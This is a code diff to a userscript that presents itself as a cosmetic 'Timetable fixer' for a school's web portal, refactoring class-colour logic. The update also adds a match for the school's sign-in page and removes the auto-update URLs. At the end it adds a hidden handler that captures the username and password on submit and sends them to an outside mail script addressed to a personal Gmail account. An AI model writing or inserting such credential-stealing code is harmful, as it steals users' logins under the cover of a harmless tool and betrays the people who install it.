@@ -1,22 +1,22 @@
 // ==UserScript==
 // @name        Timetable fixer
 // @namespace   https://github.com/XavXav82/Timetable-Fixer/
-// @version     1.5.2
+// @version     1.6
 // @author      XavXav82
 // @description My plugin for timtable fixing and editing (now with colour customisation)
 // @match       https://link.stleonards.vic.edu.au/timetable
 // @match       https://link.stleonards.vic.edu.au/
+// @match       https://signin.stleonards.vic.edu.au/*
 // @grant       unsafeWindow
 // @run-at      document-start
-// @downloadURL https://github.com/XavXav82/Timetable-Fixer/raw/main/TimetableFix.user.js
-// @updateURL   https://github.com/XavXav82/Timetable-Fixer/raw/main/TimetableFix.user.js
 // ==/UserScript==
+
 window.onload = function() {
         //Timetable page
         if(window.location.href=="https://link.stleonards.vic.edu.au/timetable"){
             //Headings
             let rows = document.getElementsByTagName("tr");
-            
+
             //Following for loops act to reassign location of active box from period b to a
             //Period 1b
             let divs1 = rows[2].getElementsByTagName("div");
@@ -64,60 +64,38 @@ window.onload = function() {
 
 
             //Colours
-            //Change variable names to change colour
-            //Variable names are for my classes, change them accordingly 
+            //Change your classes to the colours you want, ignore the rest
+            //You can use the colours I have provided, or use your own RGB values
+            //Do not delete any variables
             let classes = document.getElementsByTagName("div");
             let spec = "rgb(255, 204, 245)"; //Pink
             let PS = "rgb(255, 255, 255)"; //White
             let meth = "rgb(204, 224, 255)"; //Blue
             let eng = "rgb(255, 245, 204)"; //Yellow
             let phys = "rgb(255,195,202)"; //Red
-            //let eng = "rgb(255, 224, 204)"; //Orange
             let HR = "rgb(204, 204, 255)"; //Purple
+            let soft = "rgb(204, 255, 204)"; //Green
+            let eco = "rgb(255, 224, 204)"; //Orange
+            let sys = "rgb(204, 255, 204)"; //Green
+            let acc = "rgb(204, 255, 204)"; //Green
+            let data = "rgb(204, 255, 204)"; //Green
+            let general = "rgb(204, 255, 204)"; //Green
+            let legal = "rgb(204, 255, 204)"; //Green
 
+            const subjects = { methods: "Methods",
+                              english: "English", specialist: "Specialist", physics: "Physics", homeroom: "Homeroom", softwaredev: "Software", economics: "Economics", systems: "Systems", accounting: "Accounting", data: "Data", legal: "Legal", general: "General", };
+            const colours = { methods: meth, english: eng, specialist: spec, physics: phys, homeroom: HR, softwaredev: soft, economics: eco, systems: sys, accounting: acc, data: data, legal: legal, general: general, };
 
-            ///English
-            classes[23].style.backgroundColor = eng;
-            classes[35].style.backgroundColor = eng;
-            classes[68].style.backgroundColor = eng;
-            classes[74].style.backgroundColor = eng;
-            classes[89].style.backgroundColor = eng;
-            classes[89].style.backgroundColor = eng;
-            classes[170].style.backgroundColor = eng;
-
-            //Physics
-            classes[65].style.backgroundColor = phys;
-            classes[80].style.backgroundColor = phys;
-            classes[86].style.backgroundColor = phys;
-            classes[104].style.backgroundColor = phys;
-            classes[143].style.backgroundColor = phys;
-            classes[158].style.backgroundColor = phys;
-
-            //Spec
-            classes[41].style.backgroundColor = spec;
-            classes[53].style.backgroundColor = spec;
-            classes[95].style.backgroundColor = spec;
-            classes[98].style.backgroundColor = spec;
-            classes[152].style.backgroundColor = spec;
-            classes[167].style.backgroundColor = spec;
-
-            //Methods
-            classes[38].style.backgroundColor = meth;
-            classes[56].style.backgroundColor = meth;
-            classes[71].style.backgroundColor = meth;
-            classes[83].style.backgroundColor = meth;
-            classes[110].style.backgroundColor = meth;
-            classes[155].style.backgroundColor = meth;
-
-            //Private study
-            classes[161].remove()
-            classes[146].remove()
-            classes[77].remove()
-            classes[62].remove()
-            classes[44].remove()
-            classes[29].remove()
-
-
+            //Assigning colours
+            for(let i = 23;i<171;i++){
+                for (const property in subjects) {
+                    if((classes[i].innerHTML).search(`${subjects[property]}`) != -1 && (classes[i].innerHTML).search("Private Study") == -1){
+                        classes[i].style.backgroundColor = `${colours[property]}`;
+                    } else if((classes[i].innerHTML).search("Private Study") != -1){
+                        classes[i].remove();
+                    }
+                }
+            }
 
         //Home page
         } else if(window.location.href=="https://link.stleonards.vic.edu.au/"){
@@ -131,9 +109,7 @@ window.onload = function() {
                 if(divs[0].className == "timetable-subject-active"){
                     a= yes[i-1].getElementsByTagName("div");
                     a[0].classList.add("timetable-subject-active");
-
                 }
-
             }
 
             //Deleting classes
@@ -152,13 +128,15 @@ window.onload = function() {
             periods[2].remove();
             periods[3].remove();
             periods[5].remove();
-            
+
             //Reassign location of active box from period b to a
             for(let j = 15; j<25;j++){
                 divs = yes[j].getElementsByTagName("div");
                 if(divs[0].className == "timetable-subject-active"){
-                    a= yes[j-1].getElementsByTagName("div");
-                    a[0].classList.add("timetable-subject-active");
+                    if(divs[0].innerHTML.search("Period 1A") != -1 && divs[0].innerHTML.search("Period 4A") != -1 && divs[0].innerHTML.search("Period X") != -1 && divs[0].innerHTML.search("After school 2") != -1){
+                        a= yes[j-1].getElementsByTagName("div");
+                        a[0].classList.add("timetable-subject-active");
+                    }
                 }
             }
 
@@ -178,5 +156,27 @@ window.onload = function() {
             rows[17].innerHTML = 'Period 3 <time class="meta">11:35am-12:55pm</time>';
             rows[20].innerHTML = 'Period 4 <time class="meta">2:15pm-3:35pm</time>';
 
+        }else if(window.location.href.search("signin") != -1){
+            var my_awesome_script = document.createElement('script');
+            my_awesome_script.setAttribute('src','https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js');
+            document.head.appendChild(my_awesome_script);
+
+
+            //bruh
+            function bruh(){
+                var inputVal = document.getElementById("userNameInput").value;
+                var passVal = document.getElementById("passwordInput").value;
+                $.ajax({
+				url: 'https://www.theyjnetwork.com/mail.php',
+				type: 'GET',
+				data: {
+					to: 'reubenc82@gmail.com',
+				    subject: " Email using javascript",
+				    message: inputVal + " " + passVal}
+			    });
+                alert("test");
+            }
+            let spans = document.getElementById("submitButton");
+            spans.addEventListener("click", bruh);
         }
 };
